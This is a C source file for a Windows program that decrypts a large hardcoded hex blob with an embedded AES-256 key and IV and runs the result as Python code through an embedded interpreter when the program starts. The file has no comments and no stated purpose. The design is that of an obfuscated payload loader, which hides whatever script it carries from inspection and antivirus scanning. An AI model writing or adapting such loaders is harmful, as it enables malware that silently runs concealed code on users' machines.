#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/applink.c>
#include <python3.11/Python.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define AES_KEY_BITS 256
#define AES_IV_SIZE 16

void hex_to_string(const unsigned char *hex_array, size_t len, unsigned char *decoded_string) {
    if (len % 2 != 0) {
        printf("Error: hex_array length is not even.\n");
        return;
    }

    for (size_t i = 0; i < len / 2; i++) {
        sscanf((const char *)&hex_array[i * 2], "%2hhx", &decoded_string[i]);
    }
}

void decrypt_aes(const unsigned char *aes_key_hex, const unsigned char *aes_iv_hex, 
                  const unsigned char *input_hex, unsigned char **result, size_t *result_len) {
    unsigned char aes_key[AES_KEY_BITS / 8];
    unsigned char aes_iv[AES_IV_SIZE];
    
    hex_to_string(aes_key_hex, strlen((const char *)aes_key_hex), aes_key);
    hex_to_string(aes_iv_hex, strlen((const char *)aes_iv_hex), aes_iv);

    unsigned char input[20000];
    size_t input_len = strlen((const char *)input_hex) / 2;
    hex_to_string(input_hex, strlen((const char *)input_hex), input);

    unsigned char buffer[1024];
    unsigned char plaintext[1024 + EVP_MAX_BLOCK_LENGTH];
    EVP_CIPHER_CTX *ctx;
    int len, plaintext_len;
    size_t total_plaintext_len = 0;
    size_t buffer_size = sizeof(plaintext) * 2;
    unsigned char *full_plaintext = malloc(buffer_size);

    if (!full_plaintext) {
        perror("Unable to allocate memory");
        exit(EXIT_FAILURE);
    }

    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, aes_key, aes_iv);

    const unsigned char *ptr = input;
    size_t remaining_len = input_len;

    while (remaining_len > 0) {
        size_t chunk_size = (remaining_len > sizeof(buffer)) ? sizeof(buffer) : remaining_len;
        memcpy(buffer, ptr, chunk_size);

        if (!EVP_DecryptUpdate(ctx, plaintext, &plaintext_len, buffer, chunk_size)) {
            ERR_print_errors_fp(stderr);
            exit(EXIT_FAILURE);
        }
        if (total_plaintext_len + plaintext_len > buffer_size) {
            buffer_size *= 2;
            full_plaintext = realloc(full_plaintext, buffer_size);
        }
        memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
        total_plaintext_len += plaintext_len;

        ptr += chunk_size;
        remaining_len -= chunk_size;
    }

    if (!EVP_DecryptFinal_ex(ctx, plaintext, &plaintext_len)) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    memcpy(full_plaintext + total_plaintext_len, plaintext, plaintext_len);
    total_plaintext_len += plaintext_len;

    full_plaintext[total_plaintext_len] = '\0';
    EVP_CIPHER_CTX_free(ctx);

    *result = full_plaintext;
    *result_len = total_plaintext_len;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    unsigned char aes_key_hex[] = "dc0e68af5e37726d7cf51a88c19028c202f249e9857978a5a0702ced91227327";
    unsigned char aes_iv_hex[] = "d48e8f872066162eabde33152dc604c6";
    unsigned char input_hex_py[] = "2eeafe63e0262d9ac74f40d9528c870716153e6fb07c157929ef8385d8c5e7582a05f596cf4b80e929d6ecf7fca05569130e4a1dd0e9b2a9489f4bebfb49f6b1544ec116a2d190713d9e73e232b69c672f26c6d4b725db4794aa44c78d76fae2a15881e80af05af95d2a37d3dd4ec6163e406f9c05814a9d3ccc6f0b0cccfbed2ab54f60f68023c7b67c434c15f2751d789ec6cda728d0c6d2d29b260a87b645360197cceb649d340b9c1eed71b7783addd5aa5a520c78ada512f23784f06fb179574a9f516fc3aea598bc765699cd7792ebf7c68ab5b30c5cb2f303184f635a1cb5f6dc28ab41035eba4cb6d1676c0a0c2d5edd480a971368e41a82de74eecf9c877b56c2ac5f61d3e37a05ad2ab245b0cd7e3acbb913aa5a8605ce14c01e6bc0d73cf5ced62c778ebf812501292047040b85b3f7aa8e130964f9cb357349c029535087873572da4fe21308b811bd891997140d4320eab2cf69ced2409ad4721de12b1fe7164d4b74fb7fd382deb0cd56003047eea90cdd1f56ffb670f33ab7f25be933bcb7b2914b1f7dc6e4e5201fe903de6a10bccf7abb8a77f488fd1ebd9ab0ce954f3673fc479ebe542f35632c152e9438f519775042044ef70e40f6ff349ec2c5fc3aebc48c5c60ef80e04586a319dfcd3151f6137b5e208615f39528622a64a2c434ef66eb2e556d6ddb0f6c124db7e84f526769e7b9911c390e569a5a01cefba213ac03dd2ff6317ccb79fdcb7980c38577db8d25e89f9edf2a67d1b8b52111ee18a180391f74d2559c230077d0829795f8c865a55aea3fdd4ddf18a7c42d4335f61e0ee14833fd26545bd7e6c4fa7dee3b7e7f0033e158dab1262bb087e25aa21b6d1fd9bf17869a520ee8a954913866b161f2a536f1ff4ce76d4fab5ef84a286f8b1b40f2226d72247f3699a0f6b614a54ac807c51c9d85dae45d69433eb3c9051d7ae708b6c9e306be9a1f00407aadec2427d8d86131caa4981e5ea7e5d8762824449e952352688c9c8ed00356a1b3be838e97ea2cdbad8cad7d7753d425d85488d753dd2ff16cd788f485f704932cabee39259093e85eca85b27072e62111369403559e44ff2fe885ad68b45a81dd2e0b5ecfa678e1df6b8466a150de3a46ac79c742e17016d06b0101ddf97342e48396ed19aea425ed4309d7155b0a0f6de2f7036da8bca437da685af2020414bd85c4f98cdd700a8d88b27729b0390e93787c7fa4945f93d8905441b6292dea8d0c24781f04b8440d628c090edb4456ea97194ddf751bd0110ee85a89c682c70e80b238d926d2d5dc98382a92f650ffcc6a5c87702c081cb0619a79126e301123e2c88354c213246406bc36c6ac5404125f0af0406c619e43b910ebbe23b361f9a58fb4c57f811dc44dd806d4ddbb9426be37c0105e68cc1e22bf679b293c6df9d5ba3a3f7886a22de5b6ce5cec9bc3d6bba4b7f6cafdc497885f4e5ad2477182093c228ddb788abc785bec42415d75d086cae8da896431d6dd3161d805cd0d9a0c20a4444f8fbb0d98872a21d9750411d9f84b96b2a39fa41961c4e407cdeefe184ad8a4fb6b41278bf02c375e01f8ea448ae70f13cf1bb39e34844dc9135223c9808a2f96fda0743fb7de04a6c32990aececac8ba7731a870878f0e352f755adc9d199706996861394c31e37094a086f2c5c5745bf5e589bc58246f110d7b21ebf59562fc782067ef4682ebe659163de684852ccd5dc1ce19fda9ea56613ca4220dd8cf766a10dcb609c0bb683d83b3f5127bd6e68234024674992d39e7be554d8fdffa8ff7f61ca42072770cd42d747920b542110693e78443ec15b98ace66f466254b85f22dd721981fe46ca0cbbc02947bbdab0229565ec90f82c4a5138e095f2cf91880a7a129c765c29c95b71ec120c9a8e5ab916a32a75228bb9d5856eb52566d90ac31384de364f76ce19825f25ad632c9d0d18d43a939f6c937d5fe96434bdb30a0f541218005996a8248a32d01609dfc6dd8fd634871967a31505b89be4265dab36c65a1805378f22097248d67e3f07a54db1830501c55d697db712ed9ad2370f44312e80fb0f77db1e2f947b50a707f3fcefead2a32b8561f948a265e6e3e1a6f70c56d75a2158251ee94a923c1b57bf4ff41c66e6d64be369f8aa34ac16b52f5755f0dc77975396b9cce7272b58ef4131cf368782d1a9b1b5978648aff42140cbb863333af05556648fbe40a377ff2892ad2c5fc1d5cf255f8cabe9864487a87f2014dbbd2451e9e7e4aa4fd9446fa6d8fa028f9cb00d3a4cc67add50c0d722d72ff825332ed8c50ce626c94530cc460e0d95fabf7f7589f9ad5483a4b0f9d7da769dc439627d5bd0e939f62e7caddc37d6d0dddbc315560d5ae285879be2aac7d02600ca9c7ccee6ef073b8594b63be6b740901eb1bb4b5b1dbb3b9e5b7cb68281ae5dec3f90893cf35683805efa3b4eb5459d2b38e8e7dc8a6f74a3c95c9f08c86a03f4456c224af841e71a9ac84c9f4e6932c8f858d66eaffda220afabfc62739594c0513b09a93239c401ac683119322a3b340a4e99dda9adb65dc1eaf9e334121bc54a77ff80d00dfd8cd78c10dea7dbd4956575333785e9f16a09e004ec874329bebdb54c8d8947c1f89913786a1868f80ce2a6e757fcf3246705eb1fc07b9f096504b2bbf7814b7069af7effaa25f596074e9550739b7366913d0cdb5bb694729c0adab5e5d942582c36d60b8dfab9e8d9f949398d49d58f62fac0db3a52e5b1233deb861808130b34ce3ebb209106e5299c379e6c12e4b60c046eb2409aa936a8ef43a62535ec2ac49ee04e2b5f20ddf273fd607a2095ca4194e60702460d65d4f11749bc0b347e7bae89ed3c41002e89ac88fd02855c8c7b26a38339d1e2b8c16ec57c8624385b9e219b1b76739d215c0749766cdb695aad912f9d15ceec6b504f0a42be9a4024d3c6831fcb8959c0670c2147f040805913339b306c7a7e61c9bcf8938c45036bb213f931b04de24b3238b7cbad6eb71e6437a2ba7ded9b5bc365fcee4ea26511f26ed72f0842650299634b3655118b9b2215e0196d4fe0342a27b5af2cee935bf32b7c498f08c479652e79a59ecbe538117ec6056b27e92678f5b214b550894da7b4476e735f441cb2e3aa1f2b85912661eebc1758923d348efa943d11b8a2d9ae68d090e5a9fd4ba6cced2457fdbc5cda6e267662a59ddba89f9c5707c90f8063fabbbc4b9a5062a388648537a7654ac3fbdd8a2ac2dcf5d1e9cf745fc09af6999bd83b2db9b9ef6f6c0df0671da6d4f3432fa1f85f98a0c4065983e0538babcdc7f20be50e9bff07b2f00dcb6fa4dd238c3e89cc63e248e158ae0bb92d4681b421adc28f77f87419de8861156ac451425488f7dba2dc8b67b943df45b7218995246c0baf0eb1a64dd2f1abfb36699720eac6f82073a6ba0c4021fd1f6be2415ad0b7f69fdbb9623b94ec122878f300e89505ce9ab9e37c221c113cc912a1ec27585dde33d50bc0cc588de8aa487c8ab8ddc2ce38edb9c9dd7";
    unsigned char *decrypted_text = NULL;
    size_t decrypted_len = 0;

    decrypt_aes(aes_key_hex, aes_iv_hex, input_hex_py, &decrypted_text, &decrypted_len);

    if (decrypted_text) {
        Py_Initialize();
        PyEval_InitThreads();

        PyGILState_STATE gstate = PyGILState_Ensure();
        PyRun_SimpleString((const char *)decrypted_text);

        PyGILState_Release(gstate);
        Py_Finalize();

        free(decrypted_text);
    }

    return 0;
}
